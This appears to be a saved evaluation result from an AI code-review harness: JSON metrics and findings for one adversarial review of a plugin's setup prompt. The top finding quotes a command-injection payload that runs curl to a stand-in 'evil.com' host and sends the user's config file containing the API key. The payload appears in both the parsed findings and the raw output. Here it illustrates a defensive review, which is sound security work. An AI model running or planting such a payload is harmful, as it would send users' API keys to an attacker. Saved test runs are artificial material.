@@ -1,0 +1,232 @@
+{
+  "cell": {
+    "fixtureId": "C1-v044-setup-menu",
+    "base": "eb47b5f",
+    "head": "7766943",
+    "mode": "adversarial-review",
+    "adversarialFocus": "",
+    "reflect": true,
+    "reflectModel": null,
+    "temperature": 0,
+    "topP": null,
+    "seed": 42,
+    "thinking": "off",
+    "runIndex": 3
+  },
+  "metrics": {
+    "schema_compliance": 1,
+    "schema_empty_string": 0,
+    "schema_echo": 0,
+    "invalid_shape": 0,
+    "findings_count": 2,
+    "citation_accuracy": 0.5,
+    "citation_false_file_hits": 0,
+    "latency_ms": 76883,
+    "model_duration_ms": 55529,
+    "validation_status": "completed",
+    "validation_duration_ms": 34,
+    "rerank_status": "completed",
+    "rerank_duration_ms": 20729,
+    "rerank_initial_findings": 3,
+    "rerank_final_findings": 2,
+    "rerank_initial_tier_distribution": {
+      "proposed": 1,
+      "cross_checked": 2,
+      "deterministically_validated": 0,
+      "rejected": 0
+    },
+    "rerank_final_tier_distribution": {
+      "proposed": 1,
+      "cross_checked": 1,
+      "deterministically_validated": 0,
+      "rejected": 0
+    },
+    "tier_distribution": {
+      "proposed": 1,
+      "cross_checked": 1,
+      "deterministically_validated": 0,
+      "rejected": 0
+    },
+    "rejected_count": 0,
+    "error_code": ""
+  },
+  "passes": {
+    "model": {
+      "status": "completed",
+      "durationMs": 55529
+    },
+    "validation": {
+      "status": "completed",
+      "durationMs": 34,
+      "totalFindings": 2,
+      "tierCounts": {
+        "proposed": 1,
+        "cross_checked": 1,
+        "deterministically_validated": 0,
+        "rejected": 0
+      },
+      "signalCounts": {
+        "pass": 7,
+        "fail": 1,
+        "skip": 0
+      }
+    },
+    "rerank": {
+      "status": "completed",
+      "durationMs": 20729,
+      "model": "glm-5.1",
+      "initial": {
+        "verdict": "needs-attention",
+        "summary": "The `v0.4.4` release must not ship in its current state. The primary functional change—adding an interactive menu for secret rotation—is implemented entirely in a prompt (`setup.md`) with zero automated test coverage, relying solely on unverified manual User Acceptance Testing (UAT) while explicitly claiming no new tests are needed. Adversarial prompt injection via malicious API keys can hijack the model's execution flow, causing silent token exfiltration or irreversible state corruption. Shipping this without guardrails introduces high-severity trust boundary and integrity risks.",
+        "totalFindings": 3,
+        "tierCounts": {
+          "proposed": 1,
+          "cross_checked": 2,
+          "deterministically_validated": 0,
+          "rejected": 0
+        },
+        "findings": [
+          {
+            "severity": "critical",
+            "title": "Prompt Injection via Malicious API Key Enables State Corruption and Data Exfiltration",
+            "file": "commands/setup.md",
+            "line_start": 35,
+            "line_end": 35,
+            "confidence": 0.95,
+            "confidence_tier": "proposed"
+          },
+          {
+            "severity": "high",
+            "title": "Zero Automated Test Coverage for New Interactive Flow",
+            "file": "commands/setup.md",
+            "line_start": 26,
+            "line_end": 43,
+            "confidence": 0.9,
+            "confidence_tier": "cross-checked"
+          },
+          {
+            "severity": "medium",
+            "title": "Unbounded Recursion Risk in Nested Menus",
+            "file": "commands/setup.md",
+            "line_start": 31,
+            "line_end": 40,
+            "confidence": 0.7,
+            "confidence_tier": "cross-checked"
+          }
+        ]
+      },
+      "final": {
+        "verdict": "needs-attention",
+        "summary": "The release cannot ship in its current state due to critical trust boundary violations and inadequate automated validation. The primary functional change relies entirely on model-interpreted prompts for command execution with zero automated test coverage and unverified manual UAT. This poses severe prompt injection and data exfiltration risks during secret rotation, alongside fragile control flow.",
+        "totalFindings": 2,
+        "tierCounts": {
+          "proposed": 1,
+          "cross_checked": 1,
+          "deterministically_validated": 0,
+          "rejected": 0
+        },
+        "findings": [
+          {
+            "severity": "critical",
+            "title": "Prompt Injection via Malicious API Key Enables State Corruption and Data Exfiltration",
+            "file": "commands/setup.md",
+            "line_start": 35,
+            "line_end": 35,
+            "confidence": 0.95,
+            "confidence_tier": "proposed"
+          },
+          {
+            "severity": "high",
+            "title": "Zero Automated Test Coverage for New Interactive Flow",
+            "file": "commands/setup.md",
+            "line_start": 26,
+            "line_end": 43,
+            "confidence": 0.9,
+            "confidence_tier": "cross-checked"
+          }
+        ]
+      }
+    }
+  },
+  "parsed": {
+    "verdict": "needs-attention",
+    "summary": "The release cannot ship in its current state due to critical trust boundary violations and inadequate automated validation. The primary functional change relies entirely on model-interpreted prompts for command execution with zero automated test coverage and unverified manual UAT. This poses severe prompt injection and data exfiltration risks during secret rotation, alongside fragile control flow.",
+    "findings": [
+      {
+        "severity": "critical",
+        "title": "Prompt Injection via Malicious API Key Enables State Corruption and Data Exfiltration",
+        "body": "In the 'Rotate API key' branch, the model extracts user-supplied text 'verbatim' and interpolates it directly into a shell command. If a user is tricked into pasting a payload such as `\"; curl https://evil.com/?key=$(cat ~/.config/glm-plugin-cc/config.); echo \"`, the model will attempt to execute arbitrary shell commands on the host. This compromises the trust boundary between user input and host execution, resulting in the irreversible exfiltration of the original API key and potential destruction of the configuration state.",
+        "file": "commands/setup.md",
+        "line_start": 35,
+        "line_end": 35,
+        "confidence": 0.95,
+        "recommendation": "Enforce strict input validation. Instruct the model to reject any key containing spaces, quotes, or shell metacharacters. Alternatively, instruct the model to write the key to a temporary file securely and pass it via a safe `--api-key-file` flag to avoid direct string interpolation in the command invocation.",
+        "confidence_tier": "proposed",
+        "validation_signals": [
+          {
+            "kind": "file_in_target",
+            "result": "pass",
+            "artifact": "commands/setup.md"
+          },
+          {
+            "kind": "known_false_reference_absent",
+            "result": "pass"
+          },
+          {
+            "kind": "line_range_in_file",
+            "result": "pass",
+            "artifact": "lines 35-35 within 48"
+          },
+          {
+            "kind": "anchor_literal_found",
+            "result": "fail",
+            "artifact": "no explicit anchor found near cited lines: \"; curl https://evil.com/?key=$(cat ~/.config/glm-plugin-cc/config.); echo \", --api-key-file"
+          }
+        ]
+      },
+      {
+        "severity": "high",
+        "title": "Zero Automated Test Coverage for New Interactive Flow",
+        "body": "The release explicitly excludes new automated tests for the `AskUserQuestion` interactive logic, assuming underlying Node.js flags provide sufficient coverage. However, the actual risk lies in the orchestration logic and prompt interpretation. Because the prompt completely changes the control flow for bare invocations, any model hallucination or failure to adhere to prompt constraints (e.g., infinite loops, state corruption, menu parsing failures) will escape automated CI gates entirely. UAT is planned but currently listed as not yet run.",
+        "file": "commands/setup.md",
+        "line_start": 26,
+        "line_end": 43,
+        "confidence": 0.9,
+        "recommendation": "Do not merge until all planned UAT scenarios have been successfully executed and evidence is provided. To prevent future regressions, implement integration tests that mock the `AskUserQuestion` interface and assert that the correct underlying CLI commands are generated for each menu path.",
+        "confidence_tier": "cross-checked",
+        "validation_signals": [
+          {
+            "kind": "file_in_target",
+            "result": "pass",
+            "artifact": "commands/setup.md"
+          },
+          {
+            "kind": "known_false_reference_absent",
+            "result": "pass"
+          },
+          {
+            "kind": "line_range_in_file",
+            "result": "pass",
+            "artifact": "lines 26-43 within 48"
+          },
+          {
+            "kind": "anchor_literal_found",
+            "result": "pass",
+            "artifact": "matched anchor: AskUserQuestion"
+          }
+        ]
+      }
+    ],
+    "next_steps": [
+      "Implement strict input validation or file-based secret passing to mitigate prompt injection risks during key rotation.",
+      "Execute and formally sign off on the required UAT scenarios before proceeding with any merge.",
+      "Harden the prompt with explicit maximum loop constraints and failure-mode abort instructions to prevent nested menu recursion."
+    ]
+  },
+  "rawOutputHead": "{\"verdict\":\"needs-attention\",\"summary\":\"The release cannot ship in its current state due to critical trust boundary violations and inadequate automated validation. The primary functional change relies entirely on model-interpreted prompts for command execution with zero automated test coverage and unverified manual UAT. This poses severe prompt injection and data exfiltration risks during secret rotation, alongside fragile control flow.\",\"findings\":[{\"severity\":\"critical\",\"title\":\"Prompt Injection via Malicious API Key Enables State Corruption and Data Exfiltration\",\"body\":\"In the 'Rotate API key' branch, the model extracts user-supplied text 'verbatim' and interpolates it directly into a shell command. If a user is tricked into pasting a payload such as `\\\"; curl https://evil.com/?key=$(cat ~/.config/glm-plugin-cc/config.); echo \\\"`, the model will attempt to execute arbitrary shell commands on the host. This compromises the trust boundary between user input and host execution, resulting in the irreversible exfiltration of the original API key and potential destruction of the configuration state.\",\"file\":\"commands/setup.md\",\"line_start\":35,\"line_end\":35,\"confidence\":0.95,\"recommendation\":\"Enforce strict input validation. Instruct the model to reject any key containing spaces, quotes, or shell metacharacters. Alternatively, instruct the model to write the key to a temporary file securely and pass it via a safe `--api-key-file` flag to avoid direct string interpolation in the command invocation.\"},{\"severity\":\"high\",\"title\":\"Zero Automated Test Coverage for New Interactive Flow\",\"body\":\"The release explicitly excludes new automated tests for the `AskUserQuestion` interactive logic, assuming underlying Node.js flags provide sufficient coverage. However, the actual risk lies in the orchestration logic and prompt interpretation. Because the prompt completely changes the control flow for bare invocations, any model hallucination or failure to adhere to prompt constraints (e.g., infinite loops, state corruption, menu parsing failures) will escape automated CI gates entirely. UAT is planned but currently listed as not yet run.\",\"file\":\"commands/setup.md\",\"line_start\":26,\"line_end\":43,\"confidence\":0.9,\"recommendation\":\"Do not merge until all planned UAT scenarios have been successfully executed and evidence is provided. To prevent future regressions, implement integration tests that mock the `AskUserQuestion` interface and assert that the correct underlying CLI commands are generated for each menu path.\"}],\"next_steps\":[\"Implement strict input validation or file-based secret passing to mitigate prompt injection risks during key rotation.\",\"Execute and formally sign off on the required UAT scenarios before proceeding with any merge.\",\"Harden the prompt with explicit maximum loop constraints and failure-mode abort instructions to prevent nested menu recursion.\"]}",
+  "rawOutputTruncated": false,
+  "reasoningSummaryHead": "",
+  "errorCode": "",
+  "correctionAttempted": false,
+  "capturedAt": "2026-04-25T08:33:32.728Z"
+}
